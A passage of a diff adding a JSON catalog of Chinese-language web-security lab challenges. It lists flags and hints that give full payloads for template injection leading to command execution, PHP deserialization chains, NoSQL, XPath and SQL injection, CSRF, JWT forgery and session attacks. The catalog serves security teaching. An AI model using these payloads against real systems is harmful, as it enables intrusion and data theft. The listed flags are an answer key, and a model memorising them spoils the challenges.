+    "先输入 {{7*7}}：这些字符不在黑名单里，回显 49 说明 SSTI 还在，只是拿 config 的老路被「关键词+下划线+引号」堵死。再试 {{$_GET}}：PHP 里最顺手的超全局 $_GET（还有 $GLOBALS、get_defined_vars()）名字自带下划线，直接被拦——对应原 Flask 版 url_for 被拦的梗。",
+    "引擎 2.0 的新特性是本关钥匙：URL 查询参数会被自动注册成模板变量（?cmd=xxx → {{}} 里就能用 $xxx），而查询字符串不经过 name 的黑名单。把命令这类违禁内容放进参数里走私，模板体只写变量名；再想想哪些命令执行函数（exec/system/passthru）名字里没有下划线和引号。",
+    "完整 payload：/?name={{exec($cmd)}}&cmd=cat flag.php —— name 里零违禁字符，exec 返回命令输出的最后一行，正好是 flag.php 那行注释（Windows 本地用 cmd=type flag.php）。不想走私也可以 chr() 拼接：{{exec(chr(99).chr(97).chr(116).chr(32).chr(102).chr(108).chr(97).chr(103).chr(46).chr(112).chr(104).chr(112))}}。"
+   ],
+   "knowledge": [
+    {
+     "name": "SSTI 黑名单绕过",
+     "url": ""
+    },
+    {
+     "name": "URL 参数走私（引擎 2.0 把查询参数注册为模板变量 $xxx）",
+     "url": ""
+    },
+    {
+     "name": "chr() 拼接绕过引号过滤",
+     "url": ""
+    },
+    {
+     "name": "exec/system/passthru 命令执行",
+     "url": ""
+    },
+    {
+     "name": "$_GET/$GLOBALS/get_defined_vars 名字带下划线被拦（对应原版 url_for 梗）",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "ssti3",
+   "category": "ssti",
+   "order": 3,
+   "title": "发货通知生成器 · Twig 模板注入",
+   "path": "/ssti3",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{ssti3_e167092f}",
+   "description_html": "GET /ssti3/?name={{7 7}} → 亲爱的【49】会员：您的订单已发货... GET /ssti3/?name={{7 '7'}} → 亲爱的【49】会员：...        ← Twig（Jinja2 会是 7777777）",
+   "hints": [
+    "输入 {{7*7}} 得 49 确认注入；再输 {{7*'7'}}，若还是 49 说明是 PHP 系引擎（Twig），而不是 Jinja2（7777777）。",
+    "Twig 表达式不能直接写 PHP 语句，但 map/filter 这类过滤器接受回调函数名当参数：['参数']|map('函数名') 会把数组元素逐个传给该函数。哪个 PHP 内置函数能执行 shell 命令？",
+    "完整 payload：?name={{['cat flag.php']|map('system')}} —— 通知正文里混出 flag.php 源码。Windows 本地复现用 ['type flag.php']。"
+   ],
+   "knowledge": [
+    {
+     "name": "Twig 模板注入",
+     "url": ""
+    },
+    {
+     "name": "{{7*'7'}} 引擎指纹（Twig=49 / Jinja2=7777777）",
+     "url": ""
+    },
+    {
+     "name": "map/filter 过滤器回调执行 system",
+     "url": ""
+    },
+    {
+     "name": "Twig 3 已移除 _self.env 打法",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "ssti4",
+   "category": "ssti",
+   "order": 4,
+   "title": "公告模板预览器 · Smarty 模板注入",
+   "path": "/ssti4",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{ssti4_dd53a1dd}",
+   "description_html": "GET /ssti4/?tpl={7 7} → 【公告头条】49【公告结束】 <code {7 7}</code  被计算。注意 <code {{7 7}}</code  也会得到 49（Smarty 定界符就是花括号本身，内外层都参与解析）；但「单花括号也能执行」是 Smarty 独有特征——Jinja2/Twig 对 <code {7 7}</code  只会原样输出，这是区分 Smarty 与双花括号系引擎的指纹。",
+   "hints": [
+    "Smarty 的语法是单花括号标签 {...}，不是 {{...}}。输入 {7*7}，公告里出现 49 就说明输入被当成 Smarty 模板编译执行了。",
+    "Smarty 3/4 里 {函数名(参数)} 形式的「未注册函数标签」会被编译成 PHP 函数调用（首次使用打 Deprecated 警告但照常执行）；{if 条件} 的条件也是任意 PHP 表达式。",
+    "完整 payload：?tpl={system('cat flag.php')}（Windows 本地用 {system('type flag.php')}）；备选 {if system('cat flag.php')}{/if}。"
+   ],
+   "knowledge": [
+    {
+     "name": "Smarty 模板注入（单花括号语法）",
+     "url": ""
+    },
+    {
+     "name": "string: 资源渲染用户输入",
+     "url": ""
+    },
+    {
+     "name": "未注册函数标签 {system('cmd')} 直接调 PHP 函数",
+     "url": ""
+    },
+    {
+     "name": "{if 表达式} 注入",
+     "url": ""
+    },
+    {
+     "name": "Smarty 4 已删除 {php} 标签",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "ssti5",
+   "category": "ssti",
+   "order": 5,
+   "title": "FreeMarker 模板注入 · 文档化替代（离线模拟器）",
+   "path": "/ssti5",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{ssti5_8a3c366a}",
+   "description_html": "按主仓库 SPEC 的容器预算红线（ JVM 系一律文档替代 ），本关不部署真实 FreeMarker。交付物： 1. 静态教学页 <code index.html</code （含知识讲解、payload 家族、版本演化、自建复现指引）。 2.  前端离线模拟器 ：识别语法正确的经典 payload 后\"模拟执行\"并输出 flag —— 保证关卡在门户里仍可解、可提交，同时明确标注了这是模拟。",
+   "hints": [
+    "FreeMarker 输出用 ${...}、指令用 <#...>；旧版本里 ?<wbr>new 内建能把『类全名字符串』实例化——这是 SSTI 万能起手式。",
+    "要实例化的类：freemarker.template.<wbr>utility.Execute，FreeMarker 自带的『执行系统命令』工具类。",
+    "完整 payload：<#assign ex=\"freemarker.template.<wbr>utility.Execute\"?<wbr>new()>${ex(\"cat /<wbr>flag\")} —— 粘进页面里的离线模拟器点渲染，flag 在输出里。"
+   ],
+   "knowledge": [
+    {
+     "name": "FreeMarker 语法（${} 插值与 <#assign> 指令）",
+     "url": ""
+    },
+    {
+     "name": "?​new 内建实例化任意类",
+     "url": ""
+    },
+    {
+     "name": "Execute 工具类 RCE",
+     "url": ""
+    },
+    {
+     "name": "2.3.30 SAFER_RESOLVER 版本演化",
+     "url": ""
+    },
+    {
+     "name": "自建 JDK 复现指引",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "ssti6",
+   "category": "ssti",
+   "order": 6,
+   "title": "工单公告渲染器 · Go template 模板注入",
+   "path": "/ssti6",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{ssti6_ce6ff430}",
+   "description_html": "原题是 Go <code text/template</code  单二进制实现；按靶场\"运行时统一\"的改造要求，原 Go 交付物（<code main.go</code  / <code go.mod</code  / Windows 与 Linux 二进制）完整移入 <code original/</code  保留。现交付：",
+   "hints": [
+    "输入 {{.}} 能把数据对象按字段打印出来；{{.Banner}} 也能调用方法。但 {{7*7}} 会报「unexpected \"*\"」——Go 模板语言没有算术运算符，这不是 Jinja2，利用思路完全不同。（本关引擎是 PHP 复刻的迷你 Go template，行为按 Go 模拟）",
+    "Go 模板还能调用数据对象的导出方法。翻页面给出的源码：除了 Banner，还有一个为「包含文案片段」写的便利方法 ReadFile(path string)，没有做任何路径限制。",
+    "完整 payload：?tpl={{.ReadFile \"flag_ssti6.txt\"}} —— 方法调用用空格传参，字符串参数带引号；flag 文件就在题目目录里。"
+   ],
+   "knowledge": [
+    {
+     "name": "Go text/template 注入特性（无算术/无反射链）",
+     "url": ""
+    },
+    {
+     "name": "{{.}} 枚举数据与 {{printf \"%+v\" .}}",
+     "url": ""
+    },
+    {
+     "name": "导出方法 {{.Method args}} 可被模板调用",
+     "url": ""
+    },
+    {
+     "name": "破坏力=暴露给模板的方法面（ReadFile 越权读文件）",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "unser1",
+   "category": "unser",
+   "order": 1,
+   "title": "会员礼盒激活器 · PHP __wakeup 绕过",
+   "path": "/unser1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{unser1_702346b8}",
+   "description_html": "GET /unser1/?card=O:7:\"GiftBox\":2:{s:4:\"gift\";O:4:\"Gift\":3:{s:4:\"name\";s:5:\"alice\";s:5:\"level\";i:5;s:5:\"prize\";s:8:\"flag.php\";}s:3:\"sig\";s:10:\"GIFTBOX V1\";} → 🎫 普通会员 alice，感谢参与（当前等级 0，等级 ≥5 才有奖品） level 明明写的 5，显示却是 0：<code wakeup</code  里 <code $this- gift- lev",
+   "hints": [
+    "先用实验区的正常卡（等级 5）激活试试：wakeup 校验通过后会把 gift 的 level 归零，所以拿不到奖品。降级发生在 wakeup 里——想办法让 wakeup 走不到降级那一行。",
+    "wakeup 第一行：属性数量 ≠ 2 会 throw。往序列化串里多塞一个属性（CVE-2016-7124 的经典 payload 形状）让校验抛异常：unserialize 失败了，但内层 Gift 对象已构造完成，PHP 回收内存时它的 __destruct 照样执行且 level 未被归零。",
+    "完整 payload：O:7:\"GiftBox\":3:{s:4:\"gift\";O:4:\"Gift\":3:{s:4:\"name\";s:6:\"hacker\";s:5:\"level\";i:5;s:5:\"prize\";s:8:\"flag.php\";}s:3:\"sig\";s:10:\"GIFTBOX_V1\";s:1:\"x\";i:1;} —— 属性个数写 3 并补第三个属性 x。"
+   ],
+   "knowledge": [
+    {
+     "name": "PHP 序列化格式（O:/s:/i: 语法）",
+     "url": ""
+    },
+    {
+     "name": "魔术方法生命周期 __wakeup/__destruct",
+     "url": ""
+    },
+    {
+     "name": "CVE-2016-7124 历史与 PHP8 现代形态",
+     "url": ""
+    },
+    {
+     "name": "wakeup 异常中断 → 已构造内层对象析构仍触发",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "unser2",
+   "category": "unser",
+   "order": 2,
+   "title": "门禁日志系统 · PHP POP 链",
+   "path": "/unser2",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{unser2_4934a774}",
+   "description_html": "GET /unser2/?obj=O:7:\"DoorLog\":1:{s:4:\"name\";s:5:\"alice\";} → [日志] 门禁关闭，最后通行者：alice",
+   "hints": [
+    "从能读文件的 sink（Engine::__call）倒着推：谁会调 Engine 上不存在的 render()？Badge::__toString 里。谁会把 Badge 当字符串？DoorLog::__destruct 里的字符串拼接。",
+    "构造三个对象连起来：Engine{allow:['render'=>1], cmd:'flag.php']} → Badge{template:Engine} → DoorLog{name:Badge}。手写序列化串长度容易错（unser1 的教训），用题目目录的 gen_payload.php 生成：php gen_payload.php 直接输出 urlencode 好的 payload。",
+    "payload 形状：O:7:\"DoorLog\":1:{s:4:\"name\";O:5:\"Badge\":1:{s:8:\"template\";O:6:\"Engine\":2:{s:5:\"allow\";a:1:{s:6:\"render\";i:1;}s:3:\"cmd\";s:8:\"flag.php\";}}} —— 完整 URL 编码版跑 php gen_payload.php 即得。"
+   ],
+   "knowledge": [
+    {
+     "name": "POP 链（面向属性编程）",
+     "url": ""
+    },
+    {
+     "name": "__destruct→__toString→__call 链式触发",
+     "url": ""
+    },
+    {
+     "name": "魔术方法触发条件速查",
+     "url": ""
+    },
+    {
+     "name": "从 sink 倒推入口的链构造方法",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "unser3",
+   "category": "unser",
+   "order": 3,
+   "title": "游戏存档加载器 · Python pickle 反序列化",
+   "path": "/unser3",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{unser3_374943d4}",
+   "description_html": "php -r \"echo base64 encode(serialize('hello'));\" 再试一个真的 <code GameSave</code  对象（patch 留空），能看到 <code [destruct]</code  输出——体会 <code wakeup</code /<code destruct</code  的触发时机。",
+   "hints": [
+    "PHP 的 unserialize() 不是“纯解码”：它按串里的类名重建对象、把每个属性的控制权交给你的存档字符串，并在重建时自动调用 __wakeup、销毁时调用 __destruct。看看页面给出的 GameSave 源码——__wakeup 对非空的 patch 属性做了什么？",
+    "构造恶意存档：patch = file_get_contents('flag_unser3.txt')。手写 O:8:\"GameSave\":3:{...} 长度容易错（unser1 的教训），用题目目录的 gen_payload.php：php gen_payload.php 直接输出 base64 payload（加目标 URL 参数可生成+提交+回显一条龙）。",
+    "服务端把 unserialize() 重建出的对象 print_r 回显——__wakeup 已把 flag 读进了 patch 属性，所以“对象内容”里就有它：php gen_payload.php http://127.0.0.1:5003/unser3/ 即出 flag。"
+   ],
+   "knowledge": [
+    {
+     "name": "PHP 序列化格式与 unserialize 的对象重建语义",
+     "url": ""
+    },
+    {
+     "name": "__wakeup/__destruct 生命周期（POP 入口）",
+     "url": ""
+    },
+    {
+     "name": "回显型 payload：__wakeup eval 补丁表达式读 flag 被 print_r 回显",
+     "url": ""
+    },
+    {
+     "name": "allowed_classes 白名单 / HMAC 签名 / JSON 防御（对照 pickle 的 RestrictedUnpickler）",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "unser4",
+   "category": "unser",
+   "order": 4,
+   "title": "主题工坊 · phar 反序列化",
+   "path": "/unser4",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{unser4_41d27f13}",
+   "description_html": "老教材的经典打法是：让 <code file exists()</code  / <code getimagesize()</code  等文件函数吃到 <code phar://</code  路径，声称\"打开 phar 流即反序列化 metadata\"。 我们在 PHP 8.5（本机）与 PHP 8.2（php:8.2-cli 容器，服务器同版本）双实测：这条路已经死了 ——文件函数只解析 manifest 结构，不再 unserialize metadata（现代 PHP 把元数据反序列化改为显式/惰性）。",
+   "hints": [
+    "页面源码里没有 unserialize，但「导入预览」调用了 getMetadata()——phar 的 metadata 本身就是序列化数据，读取即反序列化。你要上传一个 metadata 里埋着 Notice 链对象的 .skin 皮肤包。",
+    "题目目录的 gen_phar.php 是生成器：php -d phar.readonly=0 gen_phar.php 产出 evil.skin（GIF89a 伪装头 + x.txt 条目 + metadata=Notice 链）。生成 phar 才需要 readonly=0，使用不需要。上传它。",
+    "上传后点 uploads/ 列表里的文件名预览（?action=preview&name=u_xxxx_evil.skin）。页面显示\"对象 Notice\"后，页面源码末尾会多出 [Notice] <?php /* flag... */ ?>——链在请求结束时析构，把 flag.php 打了出来。"
+   ],
+   "knowledge": [
+    {
+     "name": "phar 文件结构（stub/manifest/metadata）",
+     "url": ""
+    },
+    {
+     "name": "PHP8 实测：流函数触发反序列化已失效（元数据改惰性）",
+     "url": ""
+    },
+    {
+     "name": "现代可行面：Phar::loadPhar+getMetadata 显式读取用户可控 phar",
+     "url": ""
+    },
+    {
+     "name": "GIF89a 伪装与后缀无关性",
+     "url": ""
+    },
+    {
+     "name": "__destruct→__toString→__get 链",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "nosql1",
+   "category": "nosql",
+   "order": 1,
+   "title": "不是只有 SQL 才能注入 —— Mongo 操作符注入",
+   "path": "/nosql1",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{nosql1_5f77d8d2}",
+   "description_html": "NoSQL（MongoDB）把查询本身建模成  JSON 结构 。当用户输入直接进入查询文档时， 攻击者提交的不再只是\"值\"，还可以是\" 条件对象 \"：",
+   "hints": [
+    "pass[$ne]=x 使密码条件变为 {'$ne':'x'}",
+    "WAF 只拦 $ne/$gt：用 $nin 或 JSON \\u0024ne 绕过",
+    "curl -d 'user=admin&pass[$nin]=wrongpw'"
+   ],
+   "knowledge": [
+    {
+     "name": "Mongo 操作符注入",
+     "url": ""
+    },
+    {
+     "name": "$ne/$nin/$regex",
+     "url": ""
+    },
+    {
+     "name": "WAF unicode 绕过",
+     "url": ""
+    },
+    {
+     "name": "盲注提取口令",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "nosql2",
+   "category": "nosql",
+   "order": 2,
+   "title": "XML 里的注入 —— XPath 认证绕过",
+   "path": "/nosql2",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{nosql2_64af2cf8}",
+   "description_html": "XML 数据源 + 字符串拼接 XPath，与 SQL 注入同源：",
+   "hints": [
+    "user=admin' 触发报错，回显拼接后的 query",
+    "闭合引号后注入 or '1'='1",
+    "user=admin' or '1'='1，pass 任意"
+   ],
+   "knowledge": [
+    {
+     "name": "XPath 注入",
+     "url": ""
+    },
+    {
+     "name": "引号闭合 + or 恒真",
+     "url": ""
+    },
+    {
+     "name": "报错回显",
+     "url": ""
+    },
+    {
+     "name": "参数化查询修复",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "auth1",
+   "category": "auth",
+   "order": 1,
+   "title": "星云后台登录 - 万能密码(SQL注入) / 弱口令",
+   "path": "/auth1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{auth1_030a88b8}",
+   "description_html": "$sql = \"SELECT   FROM users WHERE username='$u' AND password='$p'\";  // 输入直接拼接 $row = $db- query($sql)- fetch(); if ($row) { /  登录成功  / }",
+   "hints": [
+    "先试弱口令:admin 的密码大概是用户名加点什么?(admin123 / admin@123 / 123456…)",
+    "万能密码:用户名填 admin' -- (注意 -- 后面有个空格),密码随便填,观察下方打印的 SQL 形状。",
+    "更多姿势:用户名 ' OR 1=1 -- (返回第一行 admin);密码框 ' OR '1'='1 也可以。登录后面板有 flag。"
+   ],
+   "knowledge": [
+    {
+     "name": "弱口令登录(易猜口令)",
+     "url": ""
+    },
+    {
+     "name": "万能密码:SQL 拼接 + 注释符绕过密码条件",
+     "url": ""
+    },
+    {
+     "name": "参数化查询是根治手段",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "auth2",
+   "category": "auth",
+   "order": 2,
+   "title": "星云内网门户 - 会话固定 / Cookie 伪造(可预测 session)",
+   "path": "/auth2",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{auth2_576d21a9}",
+   "description_html": "// 坑1(可预测会话):token 没有任何秘密成分 setcookie('sess', md5($row['username']));      // token = md5(用户名)",
+   "hints": [
+    "先用 guest 登录看 Cookie:sess 的值像不像某种哈希?对谁做的哈希?",
+    "administrator 用户名是公开的。算 md5(\"administrator\") 直接替换 sess 访问 panel.php。",
+    "会话固定路线:index.php?fix=<md5(administrator)> 预设 Cookie → guest 正常登录(服务端沿用旧 ID) → panel.php。"
+   ],
+   "knowledge": [
+    {
+     "name": "会话固定:登录成功必须重新生成会话 ID",
+     "url": ""
+    },
+    {
+     "name": "可预测会话 token(md5(用户名)无秘密成分)",
+     "url": ""
+    },
+    {
+     "name": "CSPRNG 随机 token + 登录换发 + Cookie 属性加固",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "csrf1",
+   "category": "csrf",
+   "order": 1,
+   "title": "星云周刊订阅站 - 基础 CSRF(GET 状态变更,无 token)",
+   "path": "/csrf1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{csrf1_40854ad6}",
+   "description_html": "// GET 请求即可改状态;没有 CSRF token,不校验 Referer/Origin if (($get['do'] ?? '') === 'subscribe') { UPDATE users SET subscribed = 1 WHERE id = $me['id'];   // $me 由 Cookie 决定 }",
+   "hints": [
+    "先自己订阅一次试试(GET api.php?do=subscribe&email=xxx)——注意\"你订阅了不算数\",目标是 cathy。",
+    "攻击页只需要一行:一个 img 标签,src 指向订阅接口,email 参数随便填。保存后运行模拟受害者。",
+    "<img src=\"api.php?do=subscribe&email=pwn@evil.example\"> —— 保存 → 运行模拟受害者 → cathy 订阅 → flag。"
+   ],
+   "knowledge": [
+    {
+     "name": "CSRF 原理:Cookie 自动携带但不代表用户知情",
+     "url": ""
+    },
+    {
+     "name": "GET 请求做状态变更的危害",
+     "url": ""
+    },
+    {
+     "name": "CSRF token / SameSite / Origin 校验修复",
+     "url": ""
+    },
+    {
+     "name": "内置模拟受害者浏览器,单人可复现完整攻击",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "csrf2",
+   "category": "csrf",
+   "order": 2,
+   "title": "星云俱乐部 VIP 转让 - CSRF Referer 包含校验绕过",
+   "path": "/csrf2",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{csrf2_3bb80cfd}",
+   "description_html": "if (strpos($referer, 'csrf2.lab') === false) {   // 只要\"包含\"子串就放行 return [403, 'Referer 校验未通过']; }",
+   "hints": [
+    "先直接 POST 试试(不带 Referer 或带别的):会被拒,错误信息把校验逻辑说得很清楚。",
+    "攻击页保存后有 URL view.php?name=你起的名字,受害者访问时的 Referer 就是这个 URL——名字里能做文章。",
+    "把攻击页命名为包含 csrf2.lab 的字符串(如 a.csrf2.lab),页面放 POST 表单 action=api.php?do=transfer_vip 隐藏域 to=hacker,运行模拟受害者。"
+   ],
+   "knowledge": [
+    {
+     "name": "Referer '包含即信任'校验的绕过(URL 可控部分携带可信子串)",
+     "url": ""
+    },
+    {
+     "name": "CSRF token 缺失,Referer 只是辅助防线",
+     "url": ""
+    },
+    {
+     "name": "host 精确匹配 + 缺失拒绝的正确写法",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "csrf3",
+   "category": "csrf",
+   "order": 3,
+   "title": "星云空间 - JSON CSRF(text/plain) + CORS 反射读取",
+   "path": "/csrf3",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{csrf3_0ccc88a2}",
+   "description_html": "漏洞 1（api.php / handler.php）： JSON 接口不校验 Content-Type ：",
+   "hints": [
+    "先用 curl 探路:GET profile.php 带/不带 X-Protection 头看 403 差别;POST api.php?do=privacy 一段 JSON,注意它不校验 Content-Type。",
+    "写攻击:enctype=text/plain 表单,input 的 name 写 {\"protection\":\"low\",\"x\":\" 、value 写 1\"} ——text/plain 报文格式 name=value 恰好拼出合法 JSON。",
+    "组合拳:降防护表单 + <script src=\"profile.php\">,保存后运行模拟受害者,flag 在跨域读取结果里。"
+   ],
+   "knowledge": [
+    {
+     "name": "JSON CSRF:enctype=text/plain 表单拼接合法 JSON(不校验 Content-Type)",
+     "url": ""
+    },
+    {
+     "name": "CORS 反射任意 Origin + Allow-Credentials 的危害",
+     "url": ""
+    },
+    {
+     "name": "自定义头只能挡读、挡不住写;CORS 白名单正确配置",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "jwt1",
+   "category": "jwt",
+   "order": 1,
+   "title": "会员站 - JWT none 算法伪造",
+   "path": "/jwt1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{jwt1_29c9a437}",
+   "description_html": "$alg = $h['alg'];                 // 算法由 token 头部自己声明 if ($alg === 'none') { return $p; }           // ← 声明 none 就免验签,payload 直接采信 if ($alg === 'HS256') { /  正确比对 HMAC  / }",
+   "hints": [
+    "把 Cookie 里的 token 复制出来,分别 Base64 解码前两段,看看 header 和 payload 长什么样。",
+    "注意 header 里的 alg 字段——如果服务端按 token 自己声明的算法来校验,把它改成 none 会发生什么?",
+    "构造 header={\"alg\":\"none\",\"typ\":\"JWT\"}, payload={\"user\":\"admin\",\"role\":\"admin\"}, 签名留空,拼成 header.payload. 替换 Cookie 访问 admin.php。"
+   ],
+   "knowledge": [
+    {
+     "name": "JWT 结构(header.payload.signature)",
+     "url": ""
+    },
+    {
+     "name": "alg=none 算法攻击(CVE-2015-9235)",
+     "url": ""
+    },
+    {
+     "name": "服务端必须硬编码期望算法",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "jwt2",
+   "category": "jwt",
+   "order": 2,
+   "title": "会员站2 - JWT 弱密钥爆破(HS256)",
+   "path": "/jwt2",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{jwt2_233df5e2}",
+   "description_html": "const SECRET = 'moonlight';   // 人类好记的弱口令,就在常规字典里",
+   "hints": [
+    "token 拿到后,对字典里每个词计算 HMAC-SHA256(header.payload, word) 与签名比对——全程离线、无速率限制。",
+    "本题附带 wordlist.txt(常用口令字典),服务端密钥就在其中;也可用 hashcat -m 16500 或 jwt-tool。",
+    "爆破出密钥后自签 {\"user\":\"admin\",\"role\":\"admin\"} 的 HS256 token 替换 Cookie 访问 admin.php。"
+   ],
+   "knowledge": [
+    {
+     "name": "HS256 对称签名与密钥强度",
+     "url": ""
+    },
+    {
+     "name": "离线字典爆破 HMAC(hashcat -m 16500 / jwt-tool)",
+     "url": ""
+    },
+    {
+     "name": "自签任意 payload",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "jwt3",
+   "category": "jwt",
+   "order": 3,
+   "title": "会员站3 - JWT RS256->HS256 算法混淆",
+   "path": "/jwt3",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{jwt3_3996c814}",
+   "description_html": "$alg = $h['alg'];                      // 验签方式由 token 自己声明 if ($alg === 'RS256') { $ok = openssl verify(\"$h64.$p64\", $sig, PUB PEM, OPENSSL ALGO SHA256) === 1;  // 公钥验签 } elseif ($alg === 'HS256') { $expect = jwt hs256 sig($h64, $p64, PUB PEM);   // ← 漏洞:拿 RSA",
+   "hints": [
+    "常规手段都失效:none 不行,HS256 弱密钥爆破也不行(私钥是 2048 位随机生成的)。",
+    "下载 pubkey.php。服务端验签逻辑:alg=RS256 用 RSA 公钥验,alg=HS256 用同一个\"密钥\"做 HMAC——公钥本身当 HMAC 密钥会怎样?",
+    "构造 header={\"alg\":\"HS256\"} payload={\"user\":\"admin\",\"role\":\"admin\"},用公钥 PEM 全文作 HMAC-SHA256 的 key 签名,替换 Cookie 访问 admin.php。"
+   ],
+   "knowledge": [
+    {
+     "name": "RS256/HS256 算法差异(非对称 vs 对称)",
+     "url": ""
+    },
+    {
+     "name": "算法混淆:用公钥作为 HMAC 密钥伪造",
+     "url": ""
+    },
+    {
+     "name": "服务端必须锁定唯一算法与密钥",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "jwt4",
+   "category": "jwt",
+   "order": 4,
+   "title": "会员站4 - JWT 过期/未验签绕过",
+   "path": "/jwt4",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{jwt4_1b6c1dc6}",
+   "description_html": "function verify token(string $t): ?array { [$h, $p, $sig] = jwt parse($t); // (签名校验代码被\"重构\"丢了) if (isset($p['exp']) && (int)$p['exp'] < time()) { return null; }  // 只检查了过期 return $p;                                                         // payload 原样采信 }",
+   "hints": [
+    "把页面上\"泄露的管理员 token\"解码:role=admin 但 exp 是 2024 年,直接用会提示已过期。",
+    "谁在执行过期检查?服务端。它检查的 exp 字段真的防篡改吗——签名被校验了吗?",
+    "把泄露 token 的 payload 中 exp 改成 9999999999,重新 Base64URL 编码替换该段(header 与签名字段原样不动),访问 admin.php。"
+   ],
+   "knowledge": [
+    {
+     "name": "exp 过期声明同样位于可篡改的 payload",
+     "url": ""
+    },
+    {
+     "name": "未校验签名时 payload 完全可控",
+     "url": ""
+    },
+    {
+     "name": "先验签后做业务校验(exp/iss/aud)的顺序原则",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "sess1",
+   "category": "sess",
+   "order": 1,
+   "title": "星舟社区 · 会话固定（Session Fixation）",
+   "path": "/sess1",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{sess1_0bbd8971}",
+   "description_html": "cd challenges/sess/sess1 php -S 127.0.0.1:8314        # 部署时挂在 /sess1；data/ 目录需进程可写 自研文件会话（<code data/sess <md5(sid) .json</code ），无外部依赖。",
+   "hints": [
+    "地址栏 ?sid=iamattacker88 试试——服务器接受了你自己选的会话 ID（这就是攻击的起点）。",
+    "保持这个自选 sid，点“🎬 模拟管理员登录”（它扮演受害者管理员在你发的链接上完成登录）。",
+    "登录后查看当前会话状态：role 已变 admin，管理员备忘（flag）直接出现。修复对照：用“🔒 修复版”按钮登录会强制换新 sid，你预置的旧 sid 立即作废。"
+   ],
+   "knowledge": [
+    {
+     "name": "会话固定攻击链：预置 sid → 受害者登录 → 攻击者接管",
+     "url": ""
+    },
+    {
+     "name": "sid 可从 URL 传入 + 登录不 session_regenerate_id 的组合危害",
+     "url": ""
+    },
+    {
+     "name": "修复：登录/提权时强制换号、只认 Cookie 携带、httpOnly",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "sess2",
+   "category": "sess",
+   "order": 2,
+   "title": "星门 SSO · 弱签名 Cookie 伪造",
+   "path": "/sess2",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{sess2_63671a77}",
+   "description_html": "cd challenges/sess/sess2 php -S 127.0.0.1:8315        # 部署时挂在 /sess2（保留 config.php.bak 可直访）",
+   "hints": [
+    "先用 player / Player@123 登录，看凭证 payload 的结构（user/role/exp 三字段，base64 后点号接签名）。",
+    "页面上就是签名算法：md5(user|role|exp|SSO_SECRET)。SSO_SECRET 藏在“清理过应该没事了”的备份里：/sess2/config.php.bak（PHP 不执行 .bak，等于明文）。",
+    "构造 payload {\"user\":\"admin\",\"role\":\"admin\",\"exp\":4102444800}，base64url 编码 + \".\" + md5(\"admin|admin|4102444800|\"+SECRET)，替换 Cookie stargate_auth 打开 vault.php。"
+   ],
+   "knowledge": [
+    {
+     "name": "签名 Cookie 的结构与信任模型（客户端 payload + 服务端签名）",
+     "url": ""
+    },
+    {
+     "name": "密钥/算法泄露（config.php.bak 明文可下）→ 离线伪造凭证",
+     "url": ""
+    },
+    {
+     "name": "裸 md5 拼接 vs hash_hmac；凭证应放服务端会话或标准 JWT+强密钥",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "cors1",
+   "category": "cors",
+   "order": 1,
+   "title": "星语笔记 · CORS 反射 Origin",
+   "path": "/cors1",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{cors1_b32ab893}",
+   "description_html": "cd challenges/cors/cors1 php -S 127.0.0.1:8308                       # 主站（部署时挂在 /cors1） cd attacker && php -S 127.0.0.1:8309        # 攻击者站点（另一端口=另一源；也可 python -m http.server 8309） 部署集成：<code attacker/</code  目录用任意静态服务跑在 非 80 端口 （如 8090）；把 <code attack.html</co",
+   "hints": [
+    "先 ?action=claim 领取身份（种下会话 Cookie），本页“我的笔记预览”确认 API 正常返回 private_note。",
+    "攻击者页面在 attacker/attack.html，部署在另一端口即是另一源：本机 cd attacker && php -S 127.0.0.1:8309，浏览器打开 http://127.0.0.1:8309/attack.html。",
